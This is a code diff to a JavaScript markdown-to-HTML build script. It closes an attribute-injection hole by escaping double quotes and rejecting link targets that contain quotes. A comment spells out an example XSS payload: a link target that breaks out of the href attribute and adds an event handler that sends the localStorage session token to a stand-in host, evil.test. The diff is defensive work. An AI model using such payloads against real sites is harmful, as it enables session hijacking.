@@ -99,16 +99,42 @@ const stripInternal = (md) =>
 // Escape for HTML text content, but leave existing character entities alone —
 // TERMS.md uses &nbsp; for sub-clause indents, and turning those into &amp;nbsp;
 // would print the entity instead of the space.
+//
+// `"` is escaped as well as the three structural characters, and that one is not
+// cosmetic: every interpolation below lands in a double-quoted ATTRIBUTE as well as
+// in text, and a `"` that survives closes the attribute. See SAFE_URL.
 const escapeHtml = (s) =>
   s
     .replace(/&(?![a-zA-Z][a-zA-Z0-9]{1,31};|#\d{1,7};|#x[0-9a-fA-F]{1,6};)/g, '&amp;')
     .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;');
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
 
 // Only these link schemes are emitted. Anything else (javascript:, data:) is a
 // build error: these pages are served from our own origin, so an injected link
 // target would run in it.
 const SAFE_URL = /^(?:https?:\/\/|mailto:|\/|#)/i;
+
+// …and a scheme whitelist alone did NOT deliver that. The href is interpolated into
+// a double-quoted attribute, the URL capture below is `[^)\s]+` (which permits a
+// quote), and escapeHtml did not escape `"` — so a target of
+//
+//   /privacy.html"/onmouseover="location='//evil.test/?c='+localStorage['sb-…']"/x="
+//
+// passed SAFE_URL (it starts with `/`), needed no whitespace, no parentheses and none
+// of `< > &`, and rendered as a live event handler on our own origin — next to the
+// app's session token in localStorage. HTML5 accepts `/` as an attribute separator,
+// which is what carried it.
+//
+// escapeHtml now closes it. This is the belt to that braces: a quote in a link target
+// is never legitimate, so it fails the build LOUDLY rather than being silently
+// encoded, because the interesting question when one appears is "who wrote that".
+//
+// It matches the ENTITY forms as well as the raw characters, because escapeHtml runs
+// FIRST (see `inline`): by the time the link regex sees a URL, a literal `"` is
+// already `&quot;`. A check for `"` alone would therefore never fire — passing, for
+// the reason that made the bug possible in the first place.
+const QUOTE_IN_URL = /["'`]|&quot;|&apos;|&#0*(?:34|39|96);|&#x0*(?:22|27|60);/i;
 
 // Placeholder for a lifted-out code span. Printable and greppable on purpose: a
 // raw control character in source makes the file read as binary to git and grep.
@@ -126,6 +152,7 @@ const inline = (text, where) => {
 
   t = t.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (_, label, url) => {
     if (!SAFE_URL.test(url)) throw new Error(`${where}: refusing unsafe link target "${url}"`);
+    if (QUOTE_IN_URL.test(url)) throw new Error(`${where}: refusing link target containing a quote "${url}" — it would break out of the href attribute`);
     const external = /^https?:/i.test(url);
     const attrs = external ? ' target="_blank" rel="noopener noreferrer"' : '';
     return `<a href="${url}"${attrs}>${label}</a>`;
